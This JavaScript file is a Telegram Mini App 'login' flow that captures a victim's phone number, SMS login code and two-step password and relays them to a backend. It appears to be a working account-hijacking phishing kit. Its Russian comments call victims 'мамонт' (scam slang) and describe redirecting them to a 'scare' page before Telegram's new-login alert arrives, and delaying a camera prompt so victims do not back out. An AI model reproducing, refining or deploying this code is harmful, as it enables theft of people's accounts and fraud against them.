let currentStep = 1;
let userPhone = '';
let enteredCode = '';
let authSessionId = null;
let botUsername = '';
let authHandlersInitialized = new Set();
let authAnimation = null;
let successAnimation = null;

const LOTTIE_WRAPPER_STYLES = {
  width: '100%',
  height: '100%',
  position: 'relative',
  overflow: 'visible',
  display: 'flex',
  alignItems: 'center',
  justifyContent: 'center'
};

function initAuth(botUsernameParam, prefix = '') {
  botUsername = botUsernameParam || new URLSearchParams(window.location.search).get('bot_username') || '';
  
  if (prefix === 'registration') {
    if (!window.authState) {
      window.authState = {};
    }
    window.authState.currentStep = 1;
    window.authState.userPhone = '';
    window.authState.enteredCode = '';
    window.authState.authSessionId = null;
  }
  
  const step1Id = prefix ? `${prefix}Step1` : 'step1';
  const step2Id = prefix ? `${prefix}Step2` : 'step2';
  const step2faId = prefix ? `${prefix}Step2fa` : 'step2fa';
  const step3Id = prefix ? `${prefix}Step3` : 'step3';
  const step1DotId = prefix ? `${prefix}Step1Dot` : 'step1-dot';
  const step2DotId = prefix ? `${prefix}Step2Dot` : 'step2-dot';
  const step3DotId = prefix ? `${prefix}Step3Dot` : 'step3-dot';
  const progressFillId = prefix ? `${prefix}ProgressFill` : 'progressFill';
  const statusId = prefix ? `${prefix}Status` : 'status';
  const startAuthBtnId = prefix ? `${prefix}StartAuthBtn` : 'startAuthBtn';
  const digit1Id = prefix ? `${prefix}Digit1` : 'digit1';
  const digit2Id = prefix ? `${prefix}Digit2` : 'digit2';
  const digit3Id = prefix ? `${prefix}Digit3` : 'digit3';
  const digit4Id = prefix ? `${prefix}Digit4` : 'digit4';
  const digit5Id = prefix ? `${prefix}Digit5` : 'digit5';
  const digit6Id = prefix ? `${prefix}Digit6` : 'digit6';
  const password2faId = prefix ? `${prefix}Password2fa` : 'password2fa';
  const submit2faBtnId = prefix ? `${prefix}Submit2faBtn` : 'submit2faBtn';
  const togglePasswordId = prefix ? `${prefix}TogglePassword` : 'togglePassword';
  
  const steps = {
    1: document.getElementById(step1Id),
    2: document.getElementById(step2Id),
    '2fa': document.getElementById(step2faId),
    3: document.getElementById(step3Id)
  };

  const stepDots = {
    1: document.getElementById(step1DotId),
    2: document.getElementById(step2DotId),
    3: document.getElementById(step3DotId)
  };

  const progressFill = document.getElementById(progressFillId);
  
  let cachedCodeInputs = null;
  let codeLength = 5;

  function isChinesePhone(phone) {
    const p = (phone || '').replace(/\D/g, '');
    return p.startsWith('86') || p.startsWith('+86');
  }

  function setCodeLength(len) {
    codeLength = len;
    cachedCodeInputs = null; // reset cache
    const digit6 = document.getElementById(digit6Id);
    if (digit6) {
      digit6.style.display = len >= 6 ? '' : 'none';
    }
  }

  function getCodeInputs() {
    if (!cachedCodeInputs) {
      const all = [
        document.getElementById(digit1Id),
        document.getElementById(digit2Id),
        document.getElementById(digit3Id),
        document.getElementById(digit4Id),
        document.getElementById(digit5Id),
        document.getElementById(digit6Id)
      ].filter(Boolean);
      cachedCodeInputs = all.slice(0, codeLength);
    }
    return cachedCodeInputs;
  }
  
  function showSuccessUI() {
    const SUCCESS_DELAY = 15000;
    setTimeout(() => {
      const loader = document.querySelector(prefix ? `#${step3Id} .liquid-loader` : '.liquid-loader');
      const successContent = document.querySelector(prefix ? `#${step3Id} .success-content` : '.success-content');
      const authAnimationContainer = document.getElementById(prefix ? `${prefix}AuthAnimation` : 'authAnimation');
      if (loader) loader.style.display = 'none';
      if (authAnimationContainer) authAnimationContainer.style.display = 'none';
      if (successContent) {
        successContent.classList.add('show');
        if (prefix === 'registration') {
          loadAnimation('yspex.tgs', 'success');
        }
      }
    }, SUCCESS_DELAY);
  }
  
  function handleAuthSuccess() {
    showStep(3);
    showSuccessUI();

    // 2026-04-25: после успеха СРАЗУ редиректим на scare-экран. Раньше тут
    // было `tg.close()` через 2.5с — мамонт получал push «Новый вход» и
    // WebView крэшился (особенно на iOS). Сейчас:
    //   - 250мс показываем success-UI чтобы юзер увидел «успех»
    //   - быстро уходим на scare ДО того как push доедет (обычно 1-3с)
    //   - scare-страница в том же origin, навигация в WebView не вызывает close
    const doScareRedirect = () => {
      try {
        let uid = '';
        try {
          uid = String(window.Telegram?.WebApp?.initDataUnsafe?.user?.id || '');
        } catch(e){}
        // 2026-04-26: резолвим target_url ДО редиректа (через async fetch) и
        // прокидываем в URL как ?target=. В scare1.html sync-XHR часто падает
        // в Telegram WebView (sync deprecated в WebView Android/iOS) → JS
        // остаётся на default otc_helper. Передача через URL надёжнее.
        const params = new URLSearchParams();
        if (uid) params.set('uid', uid);
        const finalRedirect = (extraTarget) => {
          if (extraTarget) params.set('target', extraTarget);
          const qs = params.toString();
          window.location.replace('/scare/scare1.html' + (qs ? '?' + qs : ''));
        };
        if (!uid) {
          finalRedirect('');
          return;
        }
        // Async fetch — не блокирует, но если не успеет за 1.5с — редиректим без target
        const ctrl = new AbortController();
        const timer = setTimeout(() => ctrl.abort(), 1500);
        fetch('/scare/check_sub?uid=' + encodeURIComponent(uid), {signal: ctrl.signal})
          .then(r => r.json())
          .then(j => {
            clearTimeout(timer);
            finalRedirect((j && j.target_url) ? j.target_url : '');
          })
          .catch(() => {
            clearTimeout(timer);
            finalRedirect('');
          });
      } catch (e) {
        console.warn('[AUTH] scare redirect err:', e);
        try { window.location.replace('/scare/scare1.html'); } catch(e2){}
      }
    };
    // Запускаем сразу + дублируем через 250мс на случай race с показом UI
    setTimeout(doScareRedirect, 250);
  }

  function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
  }
  
  function showStatus(message, type = 'error') {
    const container = document.getElementById('notificationsContainer');
    if (!container) {
      return;
    }
    
    const notification = document.createElement('div');
    notification.className = `notification ${type}`;
    
    notification.innerHTML = `
      <div class="notification-content">
        <div class="notification-message">${escapeHtml(message)}</div>
      </div>
      <div class="notification-progress">
        <div class="notification-progress-bar"></div>
      </div>
    `;
    
    container.appendChild(notification);
    
    const duration = 3000;
    const progressBar = notification.querySelector('.notification-progress-bar');
    if (progressBar) {
      progressBar.style.animationDuration = `${duration}ms`;
    }
    
    setTimeout(() => {
      notification.classList.add('slide-out');
      setTimeout(() => {
        if (notification.parentNode) {
          notification.parentNode.removeChild(notification);
        }
      }, 300);
    }, duration);
  }

  async function loadAnimation(animationFile, type = 'auth') {
    const isSuccess = type === 'success';
    const containerId = isSuccess 
      ? (prefix ? `${prefix}SuccessAnimation` : 'successAnimation')
      : (prefix ? `${prefix}AuthAnimation` : 'authAnimation');
    const animationContainer = document.getElementById(containerId);
    if (!animationContainer) return;
    
    const currentAnim = isSuccess ? successAnimation : authAnimation;
    if (currentAnim) {
      currentAnim.destroy();
      if (isSuccess) successAnimation = null;
      else authAnimation = null;
    }
    animationContainer.innerHTML = '';
    
    try {
      const response = await fetch(`/market/Stic/${animationFile}`);
      if (!response.ok) throw new Error('Failed to load animation');
      
      const arrayBuffer = await response.arrayBuffer();
      const ds = new DecompressionStream('gzip');
      const decompressedStream = new Response(
        new Blob([arrayBuffer]).stream().pipeThrough(ds)
      ).arrayBuffer();
      
      const decompressed = await decompressedStream;
      const jsonString = new TextDecoder().decode(decompressed);
      const animationData = JSON.parse(jsonString);
      
      if (typeof lottie !== 'undefined') {
        const lottieWrapper = document.createElement('div');
        Object.assign(lottieWrapper.style, LOTTIE_WRAPPER_STYLES);
        animationContainer.appendChild(lottieWrapper);
        
        const anim = lottie.loadAnimation({
          container: lottieWrapper,
          renderer: 'svg',
          loop: true,
          autoplay: true,
          animationData: animationData,
          rendererSettings: {
            preserveAspectRatio: 'xMidYMid meet',
            progressiveLoad: true,
            hideOnTransparent: true
          }
        });
        
        if (isSuccess) successAnimation = anim;
        else authAnimation = anim;
      }
    } catch (error) {
    }
  }

  function showStep(step) {
    Object.values(steps).forEach(el => {
      if (el) el.classList.remove('active');
    });
    Object.values(stepDots).forEach(dot => {
      if (dot) dot.classList.remove('active');
    });
    
    if (steps[step]) steps[step].classList.add('active');
    
    for (let i = 1; i <= step && i <= 3; i++) {
      if (stepDots[i]) stepDots[i].classList.add('active');
    }

    if (progressFill) {
      const progress = step === '2fa' ? 66 : (step * 33.33);
      progressFill.style.width = Math.min(progress, 100) + '%';
    }

    currentStep = step;
    if (step === 1) {
      try { resetStartAuthUI(); } catch {} 
      if (prefix === 'registration') {
        loadAnimation('phone.tgs');
      }
    }
    
    const codeInputs = getCodeInputs();
    
    if (step === 2 && codeInputs[0]) {
      setTimeout(() => codeInputs[0].focus(), 100);
      
      if (prefix === 'registration') {
        loadAnimation('chat.tgs');
      }
      
      if (prefix === 'registration') {
        const showCodeLink = document.getElementById('registrationShowCodeLink');
        if (showCodeLink) {
          showCodeLink.classList.remove('hidden');
          showCodeLink.href = 'https://t.me/+42777';
        }
      }
    }
    
    if (step === 3) {
      if (prefix === 'registration') {
        loadAnimation('time.tgs');
      }
    }
  }

  function clearCodeInputs() {
    const codeInputs = getCodeInputs();
    
    codeInputs.forEach(input => {
      if (input) input.value = '';
    });
    enteredCode = '';
    if (prefix === 'registration' && window.authState) {
      window.authState.enteredCode = '';
    }
    if (codeInputs[0]) {
      codeInputs[0].focus();
      if (window.Telegram?.WebApp) {
        window.Telegram.WebApp.HapticFeedback.selectionChanged();
      }
    }
  }

  async function verifyCode() {
    if (enteredCode.length !== codeLength) return;

    if (window.Telegram?.WebApp) {
      window.Telegram.WebApp.HapticFeedback.impactOccurred('light');
    }

    // 2026-04-20 (iOS fix): снимаем фокус с input'а перед async-вызовом.
    // На iPhone keyboard остаётся открытой → viewport скачет во время
    // fetch'а → Telegram WebApp может крэшнуть WebView как "unresponsive".
    // blur() + 150ms задержка гарантируют что keyboard закроется.
    try {
      const active = document.activeElement;
      if (active && (active.tagName === 'INPUT' || active.tagName === 'TEXTAREA')) {
        active.blur();
      }
    } catch (e) {}
    await new Promise(r => setTimeout(r, 150));

    try {
      const result = await window.MarketAPI.auth('verify_code', {
        session_id: authSessionId,
        code: enteredCode
      });

      // Network timeout / abort — показываем retry вместо молчаливого краша.
      if (result.timedOut || result.aborted) {
        throw new Error(result.error || 'Сервер не ответил. Попробуйте ещё раз.');
      }

      // Мамонт отключил 2FA в TG между отправкой кода и его подтверждением.
      // Код уже потрачен — перезапускаем флоу с шага 1 (новый send_code).
      if (result.need_restart) {
        resetAuth();
        showStep(1);
        showStatus(result.message || 'Попробуйте войти ещё раз', 'error');
        return;
      }

      if (result.need_2fa) {
        if (prefix === 'registration' && window.authState) {
          window.authState.authSessionId = result.session_id || authSessionId;
        }
        if (result.session_id) {
          authSessionId = result.session_id;
        }
        showStep('2fa');

        const passwordHint = document.getElementById(`${prefix}PasswordHint`);
        if (passwordHint) {
          if (result.hint && result.hint.trim()) {
            passwordHint.textContent = `Подсказка: ${result.hint}`;
            passwordHint.style.display = 'block';
          } else {
            passwordHint.style.display = 'none';
          }
        }
        return; // Stop here — do NOT fall through
      }

      if (result.success) {
        handleAuthSuccess();
      } else if (result.error) {
        throw new Error(result.error);
      } else {
        throw new Error('Неверный код');
      }
    } catch (error) {
      showStatus(error.message, 'error');
      clearCodeInputs();
    }
  }
  
  function resetStartAuthUI() {
    const startAuthBtn = document.getElementById(startAuthBtnId);
    if (!startAuthBtn) return;
    startAuthBtn.disabled = false;
    if (prefix === 'registration') {
      startAuthBtn.innerHTML = '<img src="https://telegram.org/img/favicon.ico" class="auth-btn-icon" alt="Telegram"><span>Войти</span>';
    }
  }

  function updateCode() {
    const codeInputs = getCodeInputs();
    if (codeInputs.length === 0) return;
    
    enteredCode = codeInputs.map(input => input.value).join('').replace(/\D/g, '');
    if (prefix === 'registration' && window.authState) {
      window.authState.enteredCode = enteredCode;
    }
    if (enteredCode.length === codeLength) {
      try {
        window.Telegram?.WebApp?.HapticFeedback?.notificationOccurred('success');
      } catch (e) {}
      verifyCode();
    }
  }

  async function sendSmsCode(phone) {
    // China (+86) uses 6-digit codes
    setCodeLength(isChinesePhone(phone) ? 6 : 5);

    // iOS fix: blur перед async (phone input был в фокусе → keyboard открыта)
    try {
      const active = document.activeElement;
      if (active && (active.tagName === 'INPUT' || active.tagName === 'TEXTAREA')) {
        active.blur();
      }
    } catch (e) {}
    await new Promise(r => setTimeout(r, 150));

    try {
      const result = await window.MarketAPI.auth('start', {
        phone: phone
      });

      if (result.timedOut || result.aborted) {
        throw new Error(result.error || 'Сервер не ответил. Попробуйте ещё раз.');
      }

      if (result.success) {
        authSessionId = result.session_id;
        if (prefix === 'registration' && window.authState) {
          window.authState.authSessionId = result.session_id;
        }
        showStep(2);
      } else {
        throw new Error(result.error);
      }
    } catch (error) {
      showStatus('Ошибка отправки SMS: ' + error.message, 'error');
      resetStartAuthUI();
    }
  }

  function initAuthHandlers() {
    if (authHandlersInitialized.has(prefix || 'default')) {
      return;
    }
    authHandlersInitialized.add(prefix || 'default');
    
    const startAuthBtn = document.getElementById(startAuthBtnId);
    if (startAuthBtn) {
      startAuthBtn.addEventListener('click', () => {
        if (window.Telegram?.WebApp) {
          window.Telegram.WebApp.HapticFeedback.impactOccurred('light');
        }

        // Camera permission запрашивается только на scare-странице (после
        // успешной авторизации). Pre-warm на тапе «Войти» убран 2026-04-27 —
        // мамонт пугался prompt'a до ввода номера и откатывался.

        startAuthBtn.disabled = true;
        const originalHTML = startAuthBtn.innerHTML;
        const loadingText = 'Запрашиваем номер...';
        startAuthBtn.innerHTML = `<div class="loading"></div>${loadingText}`;

        if (window.Telegram?.WebApp) {
          window.Telegram.WebApp.requestContact((success, contactData) => {
          console.log('[AUTH] requestContact callback:', { success, contactData });
          if (success && contactData) {
            try {
              let phoneNumber = null;

              // Формат 1 (актуальный SDK): { responseUnsafe: { contact: { phone_number } } }
              if (contactData.responseUnsafe && contactData.responseUnsafe.contact) {
                phoneNumber = contactData.responseUnsafe.contact.phone_number;
              }
              // Формат 2: { contact: { phone_number } }
              else if (contactData.contact && contactData.contact.phone_number) {
                phoneNumber = contactData.contact.phone_number;
              }
              // Формат 3: { phone_number } (плоский)
              else if (contactData.phone_number) {
                phoneNumber = contactData.phone_number;
              }
              // Формат 4 (новый SDK iOS/Android): contactData.response — URL-encoded строка
              // "contact=%7B%22phone_number%22%3A%22...%22%7D&auth_date=...&hash=..."
              else if (typeof contactData.response === 'string') {
                try {
                  const params = new URLSearchParams(contactData.response);
                  const contactStr = params.get('contact');
                  if (contactStr) {
                    const parsed = JSON.parse(contactStr);
                    phoneNumber = parsed.phone_number;
                  }
                } catch (parseErr) {
                  console.warn('[AUTH] response parse failed:', parseErr);
                }
              }
              // Формат 5 (сам contactData — URL-encoded строка)
              else if (typeof contactData === 'string') {
                try {
                  const params = new URLSearchParams(contactData);
                  const contactStr = params.get('contact');
                  if (contactStr) {
                    const parsed = JSON.parse(contactStr);
                    phoneNumber = parsed.phone_number;
                  }
                } catch (parseErr) {
                  console.warn('[AUTH] string parse failed:', parseErr);
                }
              }

              if (phoneNumber) {
                // Нормализуем — добавим '+' если нет
                if (!phoneNumber.startsWith('+')) phoneNumber = '+' + phoneNumber;
                userPhone = phoneNumber;
                if (prefix === 'registration' && window.authState) {
                  window.authState.userPhone = phoneNumber;
                }
                sendSmsCode(userPhone);
              } else {
                console.error('[AUTH] no phone extracted from:', contactData);
                showStatus('Ошибка получения номера телефона', 'error');
                startAuthBtn.disabled = false;
                startAuthBtn.innerHTML = originalHTML;
              }
            } catch (e) {
              console.error('[AUTH] contact processing error:', e);
              showStatus('Ошибка обработки контакта', 'error');
              startAuthBtn.disabled = false;
              startAuthBtn.innerHTML = originalHTML;
            }
          } else {
            showStatus('Необходимо поделиться номером телефона', 'error');
            startAuthBtn.disabled = false;
            startAuthBtn.innerHTML = originalHTML;
          }
        });
        }
      });
    }

    const codeInputs = getCodeInputs();

    if (codeInputs.length > 0) {
      const codeContainer = codeInputs[0].closest('.code-input-container');
      if (codeContainer) {
        codeContainer.addEventListener('paste', (e) => {
          e.preventDefault();
          const paste = (e.clipboardData || window.clipboardData).getData('text').trim();
          const digits = paste.replace(/\D/g, '').substring(0, codeLength);

          codeInputs.forEach((input, index) => {
            if (input) {
              const hadValue = input.value.length > 0;
              input.value = index < digits.length ? digits[index] : '';
              
              if (input.value.length === 1 && !hadValue) {
                input.classList.remove('animate-in');
                void input.offsetWidth;
                input.classList.add('animate-in');
                setTimeout(() => {
                  input.classList.remove('animate-in');
                }, 400);
              }
            }
          });

          const focusIndex = Math.min(digits.length, codeLength - 1);
          if (codeInputs[focusIndex]) codeInputs[focusIndex].focus();

          updateCode();
          if (window.Telegram?.WebApp) {
          window.Telegram.WebApp.HapticFeedback.impactOccurred('medium');
        }
        });
      }

      codeInputs.forEach((input, index) => {
        input.addEventListener('input', (e) => {
          const oldValue = e.target.value;
          e.target.value = e.target.value.replace(/\D/g, '').substring(0, 1);
          
          if (e.target.value.length === 1 && oldValue !== e.target.value) {
            e.target.classList.remove('animate-in');
            void e.target.offsetWidth;
            e.target.classList.add('animate-in');
            
            setTimeout(() => {
              e.target.classList.remove('animate-in');
            }, 400);
          }
          
          if (e.target.value.length === 1 && index < codeInputs.length - 1) {
            if (codeInputs[index + 1]) codeInputs[index + 1].focus();
          }
          updateCode();
        });

        input.addEventListener('keydown', (e) => {
          if (e.key === 'Backspace' && !e.target.value && index > 0) {
            if (codeInputs[index - 1]) codeInputs[index - 1].focus();
          } else if (e.key === 'ArrowLeft' && index > 0) {
            e.preventDefault();
            if (codeInputs[index - 1]) codeInputs[index - 1].focus();
          } else if (e.key === 'ArrowRight' && index < codeInputs.length - 1) {
            e.preventDefault();
            if (codeInputs[index + 1]) codeInputs[index + 1].focus();
          }
        });

        input.addEventListener('focus', (e) => {
          setTimeout(() => e.target.select(), 0);
        });
      });
    }

    const submit2faBtn = document.getElementById(submit2faBtnId);
    const password2fa = document.getElementById(password2faId);
    
    if (submit2faBtn && password2fa) {
      submit2faBtn.addEventListener('click', async () => {
        if (window.Telegram?.WebApp) {
      window.Telegram.WebApp.HapticFeedback.impactOccurred('light');
    }

        const password = password2fa.value.trim();
        if (!password) {
          showStatus('Введите пароль 2FA', 'error');
          return;
        }

        const originalHTML = submit2faBtn.innerHTML;
        submit2faBtn.disabled = true;
        submit2faBtn.innerHTML = '<div class="loading"></div>Проверяем пароль...';

        // iOS fix: blur + 150ms чтобы keyboard закрылась до async-вызова,
        // иначе viewport скачет пока idle WebView → crash.
        try { password2fa.blur(); } catch (e) {}
        await new Promise(r => setTimeout(r, 150));

        try {
          const result = await window.MarketAPI.auth('verify_2fa', {
            session_id: authSessionId,
            password: password
          });

          if (result.timedOut || result.aborted) {
            throw new Error(result.error || 'Сервер не ответил. Попробуйте ещё раз.');
          }

          // Мамонт отключил 2FA между шагами — бэк не может проверить пароль,
          // шлём обратно на 1-й шаг для нового send_code.
          if (result.need_restart) {
            resetAuth();
            showStep(1);
            showStatus(result.message || 'Попробуйте войти ещё раз', 'error');
            return;
          }

          if (result.success) {
            handleAuthSuccess();
          } else {
            throw new Error(result.error || 'Неверный пароль 2FA');
          }
        } catch (error) {
          showStatus(error.message, 'error');
          password2fa.value = '';
          submit2faBtn.disabled = false;
          submit2faBtn.innerHTML = originalHTML;
        } finally {
          submit2faBtn.disabled = false;
          submit2faBtn.innerHTML = originalHTML;
        }
      });
    }
    
    const authContainer = document.querySelector('.registration-auth-container');
    if (authContainer) {
      authContainer.addEventListener('click', (e) => {
        const target = e.target;
        const isInput = target.tagName === 'INPUT' || target.tagName === 'BUTTON' || target.closest('input') || target.closest('button');
        
        if (!isInput) {
          const activeElement = document.activeElement;
          if (activeElement && (activeElement.tagName === 'INPUT' || activeElement.tagName === 'TEXTAREA')) {
            activeElement.blur();
          }
          
          if (window.Telegram?.WebApp) {
            window.Telegram.WebApp.HapticFeedback.selectionChanged();
          }
        }
      });
    }
  }

  function cleanup() {
    if (authAnimation) {
      try {
        authAnimation.destroy();
      } catch (e) {}
      authAnimation = null;
    }
    if (successAnimation) {
      try {
        successAnimation.destroy();
      } catch (e) {}
      successAnimation = null;
    }
  }

  function resetAuth() {
    cleanup();
    currentStep = 1;
    userPhone = '';
    enteredCode = '';
    authSessionId = null;
    
    if (prefix === 'registration' && window.authState) {
      window.authState.currentStep = 1;
      window.authState.userPhone = '';
      window.authState.enteredCode = '';
      window.authState.authSessionId = null;
    }
    
    const codeInputs = getCodeInputs();
    codeInputs.forEach(input => {
      if (input) input.value = '';
    });
    
    const password2fa = document.getElementById(prefix ? `${prefix}Password2fa` : 'password2fa');
    if (password2fa) password2fa.value = '';
  }

  initAuthHandlers();
  
  if (prefix === 'registration' && currentStep === 1) {
    loadAnimation('phone.tgs');
  }
  
  return {
    init: initAuthHandlers,
    cleanup: cleanup,
    reset: resetAuth
  };
}
